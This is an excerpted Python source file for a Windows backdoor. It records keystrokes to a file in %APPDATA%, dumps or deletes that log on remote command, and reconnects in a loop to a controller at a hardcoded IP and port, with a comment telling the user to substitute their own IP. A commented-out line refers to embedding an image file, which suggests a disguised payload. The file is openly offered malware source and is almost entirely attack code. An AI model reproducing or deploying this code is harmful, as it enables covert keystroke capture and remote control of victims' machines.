...
class Backdoor:
    ...
    def save_strokes(self, key):
        self.strokes_file = os.environ["appdata"] + "\\strokes.txt"
        with open(self.strokes_file, "a") as ks_file:
    ...
    def key_log_dump(self):
        ...
        return open(self.strokes_file, "r").read()


    def key_log_stop(self):
        self.keyboard_listener.stop()
        os.remove(self.strokes_file)
        self.kl_start = False
    ...
    def run(self):
        while 1:
            ...
            try:
                ...
                elif self.check_cmd(recv_cmd, "stop_kl", 1):
                    self.key_log_stop()
...
# Uncommnet it to Embed a file on it

# image = sys._MEIPASS + ".\\file.jpg"
...
while 1:
    time.sleep(2)
    try:
        wiw = Backdoor("10.0.10.6", 7007) # Change it to your IP
        wiw.run()
    except Exception:
        continue
